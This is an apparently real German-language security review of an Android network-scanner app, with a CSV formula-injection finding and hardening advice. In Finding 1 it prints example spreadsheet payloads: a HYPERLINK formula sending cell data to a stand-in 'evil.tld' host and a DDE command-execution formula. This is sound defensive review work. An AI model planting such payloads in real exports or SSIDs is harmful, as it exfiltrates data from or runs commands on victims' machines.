# Security Review – ScannerApp

**Stand:** 2026-04-17
**Umfang:** Gesamtes Projekt (`app/src/main/**`, `AndroidManifest.xml`, `app/build.gradle.kts`)
**Reviewer-Modus:** Senior Security Engineer – Fokus auf konkret ausnutzbare Schwachstellen + Defense-in-Depth-Härtung

---

## 1. Executive Summary

Die ScannerApp ist eine lokale Android-Anwendung ohne Server-Komponente, ohne WebView, ohne Authentifizierungs-Layer und ohne unsichere Deserialisierung. Die Angriffsfläche ist dementsprechend klein und auf folgende Bereiche begrenzt:

- IPC-Empfangsflächen (Activity/Service/Provider im Manifest)
- Netzwerk-I/O (HTTP-Fetch von UPnP-Deskriptoren, TCP-Connect im Portscan, ICMP/UDP)
- Subprozess-Aufrufe (`ping`, `ip neigh show`, `cat /proc/net/arp`)
- SQL-Schicht (Room-DAO)
- Export-/Share-Flow (CSV/JSON/PDF/KML → FileProvider → `ACTION_SEND`)

### Ergebnis

| Kategorie | Anzahl |
|---|---|
| **Kritisch (direkt ausnutzbar)** | 0 |
| **Hoch** | 0 |
| **Mittel** | 1 (CSV-Formula-Injection beim Öffnen in Excel) |
| **Defense-in-Depth / Härtung** | 5 |

Es wurden **keine direkt ausnutzbaren Schwachstellen** gefunden, die den RCE-/Auth-Bypass-/Datenleck-Schwellwert einer regulären PR-Prüfung erreichen. Die unten aufgeführten Härtungs-Empfehlungen senken die Angriffsfläche im Missbrauchsfall (verlorenes/gerootetes Gerät, ADB-Zugriff, Export-Weitergabe an Dritte).

---

## 2. Geprüfte Vektoren (negativ bestätigt)

Diese Kategorien wurden explizit geprüft und für **nicht ausnutzbar** befunden. Sie stehen hier dokumentiert, damit zukünftige Änderungen diese Gewähr nicht unbemerkt brechen.

| Vektor | Ort(e) | Begründung |
|---|---|---|
| **Command Injection** | `PingUtil.kt:46`, `NetworkDiscovery.kt:180`, `NetworkDiscovery.kt:206` | Alle drei `Runtime.exec`-Aufrufe verwenden entweder einen fest kodierten String oder die `arrayOf(...)`-Form mit Konstanten. Der einzige variable Wert (`host` in `PingUtil.ping`) wird als separates argv-Element übergeben (ohne Shell) und von Callern nur mit `"8.8.8.8"` oder DHCP-Gateway-IP gespeist – nie mit untrusted Input. |
| **SQL-Injection** | `DeviceDao.kt` | Alle Abfragen nutzen Room `@Query` mit benannten Bind-Parametern (`:query`, `:id`, …). Keine String-Konkatenation. |
| **XXE / unsichere Deserialisierung** | `NetworkDiscovery.kt:526` (UPnP-XML), gesamter Tree | UPnP-Beschreibungen werden per Regex geparst – kein DOM/SAX-Parser, also kein XXE. Keine `ObjectInputStream`, keine `Serializable`-Roundtrips, kein YAML/Pickle-Äquivalent. |
| **WebView / XSS / JS-Bridge** | – | Projekt enthält keinen `WebView`, `loadUrl` oder `addJavascriptInterface`. Compose `Text` rendert keine Markup-Sprachen. |
| **FileProvider-Missbrauch** | `AndroidManifest.xml:62-70`, `file_paths.xml` | Provider ist `exported="false"` und exponiert nur `cache-path`. URIs werden per `FLAG_GRANT_READ_URI_PERMISSION` auf user-initiierte Share-Aktion hin temporär gewährt. |
| **Unsichere IPC-Oberfläche** | `AndroidManifest.xml:47-60` | Nur `MainActivity` ist `exported="true"` (für LAUNCHER erforderlich). `ScanService` ist `exported="false"`. Keine impliziten Intent-Filter auf `ScanService`. |
| **SSDP/UPnP-Antwort-Injection** | `NetworkDiscovery.kt:414-563` | LOCATION-URL ist von jedem Host auf demselben L2-Segment kontrollierbar, Code macht aber nur HTTP-GET mit 2 s Timeout und parst die Antwort per Regex in reine Anzeige-Strings. Keine Code-Ausführung, keine HTML-Rendering-Ausgabe. |
| **KML-/XML-Injection beim Wardriving-Export** | `WardrivingTracker.kt:184-232` | Einzig vom Angreifer kontrollierbares Feld (`ssid`) läuft durch `escapeXml()`. `bssid` ist MAC-formatiert, `securityType` ist Enum-Wert. |
| **TLS-/Crypto-Schwächen** | – | App verwendet keine eigene Krypto, speichert keine Credentials, hat keinen Auth-Layer. Kein angreifbarer Crypto-Code vorhanden. |

---

## 3. Findings

### Finding 1 – CSV Formula Injection beim Öffnen in Excel/LibreOffice

- **Severity:** Mittel
- **Confidence:** Mittel (Exploit-Pfad erfordert User-Interaktion mit der Export-Datei)
- **Kategorie:** Injection (csv_formula)
- **Betroffene Stellen:**
  - `app/src/main/java/com/scanner/app/util/ExportManager.kt:117-138` (Inventar-CSV – Feld `device.name`, `customLabel`, `notes`, `metadata`)
  - `app/src/main/java/com/scanner/app/util/WardrivingTracker.kt:149-179` (WiGLE-CSV – Feld `ssid`)

- **Beschreibung:** `escapeCsv(value)` escapet nur `;`, `"` und `\n`. Beginnt der Feldwert aber mit `=`, `+`, `-`, `@`, Tab oder CR, interpretiert Excel/LibreOffice den Inhalt beim Öffnen als Formel. Ein Angreifer im Funkbereich kann eine SSID wie `=HYPERLINK("http://evil.tld/?x="&A1,"Klick!")` oder `=cmd|'/c calc'!A1` setzen, die beim WiGLE-/Inventar-Export und anschließendem Öffnen der CSV ausgeführt wird.
- **Exploit-Szenario:** Angreifer stellt in der Nähe des Nutzers einen AP mit präparierter SSID auf → Nutzer scannt → exportiert Inventar/Wardriving als CSV → teilt die Datei oder öffnet sie selbst in Excel → Formel wird ausgeführt (Datenexfiltration via `=WEBSERVICE(...)` oder `=HYPERLINK(...)` oder DDE-Execution in älteren Excel-Versionen).
- **Empfehlung:** Erweiterung von `escapeCsv` um das Präfixen kritischer Felder mit einem Apostroph:
  ```kotlin
  private fun escapeCsv(value: String): String {
      val needsPrefix = value.isNotEmpty() && value[0] in setOf('=', '+', '-', '@', '\t', '\r')
      val safe = if (needsPrefix) "'$value" else value
      return if (safe.contains(";") || safe.contains("\"") || safe.contains("\n")) {
          "\"${safe.replace("\"", "\"\"")}\""
      } else safe
  }
  ```
  Gleiches Muster in `WardrivingTracker.escapeCsv` anwenden.

---

## 4. Defense-in-Depth – Härtungs-Empfehlungen

Diese Punkte sind keine Schwachstellen im PR-Review-Sinne. Sie reduzieren Schaden bei nachgelagerten Vorfällen (verlorenes Gerät, Reverse Engineering, Netzwerk-MitM auf HTTP-Paths).

### H-1: `android:allowBackup="true"` ohne Backup-Regeln

- **Ort:** `AndroidManifest.xml:40`
- **Problem:** Über `adb backup` (oder bei aktivem Auto-Backup zu Google) lässt sich die komplette Room-DB (`discovered_devices`, Wardriving-GPS-Historie) und alle Cache-Exports extrahieren. Bei verlorenem, entsperrtem Gerät mit aktivem USB-Debugging ist das trivial.
- **Empfehlung:** Auto-Backup/D2D-Transfer auf sensible Daten einschränken:
  ```xml
  <!-- AndroidManifest.xml -->
  <application
      android:allowBackup="true"
      android:dataExtractionRules="@xml/data_extraction_rules"
      android:fullBackupContent="@xml/backup_rules"
      ... >
  ```
  ```xml
  <!-- res/xml/backup_rules.xml (API < 31) -->
  <full-backup-content>
      <exclude domain="database" path="scanner_app.db" />
      <exclude domain="database" path="scanner_app.db-shm" />
      <exclude domain="database" path="scanner_app.db-wal" />
      <exclude domain="file" path="wardriving/" />
      <exclude domain="sharedpref" />
  </full-backup-content>
  ```
  ```xml
  <!-- res/xml/data_extraction_rules.xml (API ≥ 31) -->
  <data-extraction-rules>
      <cloud-backup>
          <exclude domain="database" />
          <exclude domain="file" path="wardriving/" />
      </cloud-backup>
      <device-transfer>
          <include domain="database" path="scanner_app.db" />
      </device-transfer>
  </data-extraction-rules>
  ```

### H-2: `android:usesCleartextTraffic="true"` applikationsweit

- **Ort:** `AndroidManifest.xml:41`
- **Problem:** Derzeit global gesetzt, weil UPnP-Deskriptoren (`NetworkDiscovery.fetchUpnpDescription`) klassisch über HTTP geliefert werden. Dadurch erlaubt die App aber auch HTTP-Traffic zu beliebigen anderen Hosts – relevant, falls das Projekt später z. B. einen Updater, Telemetrie oder ein WebUI-Fetch bekommt.
- **Empfehlung:** Cleartext auf RFC1918-Ranges + Link-Local beschränken, Rest via TLS erzwingen:
  ```xml
  <!-- AndroidManifest.xml -->
  <application
      android:networkSecurityConfig="@xml/network_security_config"
      ... >
  ```
  ```xml
  <!-- res/xml/network_security_config.xml -->
  <network-security-config>
      <base-config cleartextTrafficPermitted="false" />
      <domain-config cleartextTrafficPermitted="true">
          <domain includeSubdomains="true">10.0.0.0/8</domain>
          <domain includeSubdomains="true">172.16.0.0/12</domain>
          <domain includeSubdomains="true">192.168.0.0/16</domain>
          <domain includeSubdomains="true">169.254.0.0/16</domain>
          <domain includeSubdomains="true">fe80::/10</domain>
          <domain includeSubdomains="true">fd00::/8</domain>
      </domain-config>
  </network-security-config>
  ```
  Damit bleibt das UPnP-Feature auf dem LAN funktionsfähig, während zukünftige HTTP-Zugriffe ins offene Netz scheitern. `android:usesCleartextTraffic` kann entfernt werden.

### H-3: `isMinifyEnabled = false` im Release-Build

- **Ort:** `app/build.gradle.kts:24-30`
- **Problem:** Release-APK enthält unveränderte Klassen-/Methodennamen. Reverse Engineering der Scanner-Logik und Extraktion von UUID-/OUI-Tabellen ist trivial. Kein Schutz gegen die kleinen Integritäts-/Kopier-Bedrohungen.
- **Empfehlung:**
  ```kotlin
  release {
      isMinifyEnabled = true
      isShrinkResources = true
      proguardFiles(
          getDefaultProguardFile("proguard-android-optimize.txt"),
          "proguard-rules.pro"
      )
  }
  ```
  Room-/Compose-/Accompanist-Keep-Rules sind durch deren AAR-Consumer-Rules bereits abgedeckt. Für `osmdroid` sind ggf. zusätzliche Keep-Rules nötig – beim ersten Release-Build testen.

### H-4: `WardrivingTracker` – GPS-Daten unverschlüsselt und mit unbegrenzter Lebensdauer

- **Ort:** `app/src/main/java/com/scanner/app/util/WardrivingTracker.kt` + Room-DB (allgemein)
- **Problem:** Wardriving kombiniert BSSID + GPS + Zeitstempel. Das ist nach DSGVO quasi-Personenbezug (Rückschluss auf Aufenthaltsorte des Geräteträgers). Aktuell liegen die Daten plus die Room-DB unverschlüsselt im App-Verzeichnis. Bei rootetem/verlorenem Gerät vollständig lesbar.
- **Empfehlung (optional, je nach Bedrohungsmodell):**
  - Room-DB mit SQLCipher oder **`net.zetetic:android-database-sqlcipher`** /
    **`androidx.sqlite:sqlite-framework` + `androidx.security:security-crypto`** verschlüsseln, Schlüssel in Android Keystore ablegen.
  - Wardriving-Rohdaten nach konfigurierbarer Retention (z. B. 30 Tage) automatisch löschen – analog zur vorhandenen `deleteOldReadings(before: Instant)`-Logik, aber für `WardrivingEntry`.
  - Export-Datei-Namen mit zufälligem Suffix versehen und nach dem Share-Intent aus dem Cache löschen (`context.cacheDir` wird zwar von Android bereinigt, aber nicht deterministisch).

### H-5: UPnP-/SSDP-Timeouts & Host-Scope nicht beschränkt

- **Ort:** `NetworkDiscovery.kt:512-521` (`fetchUpnpDescription`)
- **Problem:** Timeouts sind auf 2 s gesetzt – ausreichend. Aber die aus der SSDP-Antwort stammende URL wird ohne Whitelist-Check abgerufen. Ein Angreifer im selben LAN könnte damit den Client veranlassen, beliebige HTTP-URLs zu kontaktieren (auch außerhalb des LAN, sofern Routing erlaubt). Impact ist niedrig (nur GET, kein Rendern, kein JS), aber defensiv einschränkbar.
- **Empfehlung:** Vor dem `openConnection` prüfen, dass der Host aus der `LOCATION`-URL mit der Source-Adresse des SSDP-Pakets übereinstimmt **und** innerhalb einer privaten Range liegt:
  ```kotlin
  private fun isPrivateAddress(host: String): Boolean {
      return try {
          val addr = InetAddress.getByName(host)
          addr.isSiteLocalAddress || addr.isLinkLocalAddress || addr.isLoopbackAddress
      } catch (_: Exception) { false }
  }
  ```
  Im SSDP-Loop den Wert von `response.address.hostAddress` vergleichen mit dem Host aus der `LOCATION`-URL und verwerfen, wenn sie abweichen oder nicht privat sind.

---

## 5. Zusammenfassung der empfohlenen Änderungen

| # | Datei / Ort | Typ | Aufwand |
|---|---|---|---|
| F-1 | `ExportManager.kt`, `WardrivingTracker.kt` | Formula-Escape in `escapeCsv` | ~5 Zeilen pro Datei |
| H-1 | `AndroidManifest.xml` + neue `res/xml/backup_rules.xml` + `data_extraction_rules.xml` | Backup-Scope | 3 Dateien, 20 Zeilen |
| H-2 | `AndroidManifest.xml` + `res/xml/network_security_config.xml` | Cleartext-Einschränkung | 2 Dateien, ~15 Zeilen |
| H-3 | `app/build.gradle.kts` | Release-Minify | 3 Zeilen + evtl. Keep-Rules |
| H-4 | Room-DB + `WardrivingTracker` | DB-Encryption + Retention | mittel (Dependency + Migration) |
| H-5 | `NetworkDiscovery.kt:414-521` | SSDP-Host-Whitelist | ~10 Zeilen |

Priorisierung aus meiner Sicht: **F-1 → H-1 → H-2 → H-3 → H-5 → H-4.**

---

## 6. Anhang – Methodik

- Gelesen: `AndroidManifest.xml`, `file_paths.xml`, `build.gradle.kts`, alle Dateien unter `app/src/main/java/com/scanner/app/**`.
- Gesucht nach: `WebView|loadUrl|addJavascriptInterface`, `Runtime.exec|ProcessBuilder`, `Intent.ACTION_VIEW|Uri.parse|openConnection`, `DocumentBuilder|XMLReader|SAXParser|Serializable|ObjectInputStream`, `networkSecurityConfig|dataExtractionRules|fullBackupContent`.
- Ausgeschlossen gemäß Review-Vorgaben: DoS, Rate-Limiting, Logging ohne PII, theoretische Race Conditions, Dependency-Aktualität, Memory-Safety in JVM-Sprachen, Best-Practice-Mängel ohne konkreten Exploit-Pfad.
